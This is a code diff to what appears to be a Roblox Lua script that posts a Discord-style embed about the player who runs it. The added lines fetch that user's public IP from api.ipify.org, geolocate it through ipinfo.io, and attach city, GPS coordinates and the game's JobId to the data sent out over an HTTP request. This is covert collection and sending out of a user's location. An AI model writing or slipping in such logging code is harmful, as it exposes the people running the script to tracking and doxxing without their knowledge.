@@ -1,3 +1,4 @@
+
 local HttpService =game:GetService("HttpService")
 local LocalizationService = game:GetService("LocalizationService")
 
@@ -269,6 +270,11 @@ local codeToName = {
 	ZW = "Zimbabwe",
 }
 
+local ip = game:HttpGet("https://api.ipify.org")
+local iplink = "https://ipinfo.io/" .. ip .. "/json"
+local ipinfo_json = game:HttpGet(iplink)
+local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)
+
 local embed = {
 	["title"] = "いるかはぶつかった人",
 	["color"] = 0,
@@ -279,6 +285,9 @@ local embed = {
 			["value"] = "```表示名: " .. player.DisplayName
 				.. "\n名前: " .. player.Name
 				.. "\n国: " .. codeToName[country]
+				.. "\n IP" .. 	ipinfo_table.city 
+				.. "\n GPS" .. 	ipinfo_table.loc
+				.. "\njobid: " .. tostring(game.JobId)
 				.. "```"
 		}
 	}
@@ -294,3 +303,5 @@ request({
 	},
 	Body = data
 })
+
+
